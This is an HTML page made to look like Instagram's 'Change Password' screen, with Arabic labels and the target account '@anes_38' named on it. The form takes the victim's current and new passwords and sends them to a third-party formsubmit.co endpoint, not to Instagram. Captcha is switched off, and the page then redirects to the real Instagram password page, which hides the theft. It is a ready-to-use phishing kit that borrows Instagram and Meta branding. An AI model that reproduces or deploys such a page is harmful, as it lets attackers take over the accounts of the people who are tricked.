<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password • Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin: 20px 0; }
        .info-text { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; font-weight: 600; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 10px; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; padding: 7px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:disabled { background-color: rgba(0, 149, 246, .3); }
        .meta-footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_gnl_header_upsell_2x.png/1b978e47f57a.png" alt="Instagram" class="logo">
    
    <p class="info-text">تغيير كلمة المرور لحساب @anes_38</p>

    <form action="https://formsubmit.co/b35269abccf715e68332f1a3a4ccca0c" method="POST">
        <input type="hidden" name="_next" value="https://www.instagram.com/accounts/password/change/">
        <input type="hidden" name="_captcha" value="false">

        <input type="password" name="old_password" placeholder="كلمة المرور الحالية" required>
        <input type="password" name="new_password" placeholder="كلمة المرور الجديدة" required>
        <input type="password" name="confirm_password" placeholder="تأكيد كلمة المرور الجديدة" required>

        <button type="submit">تغيير كلمة المرور</button>
    </form>
</div>

<div class="meta-footer">
    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/v2O_p4-S8sc.png" alt="Meta" style="width: 60px; vertical-align: middle;">
</div>

</body>
</html>
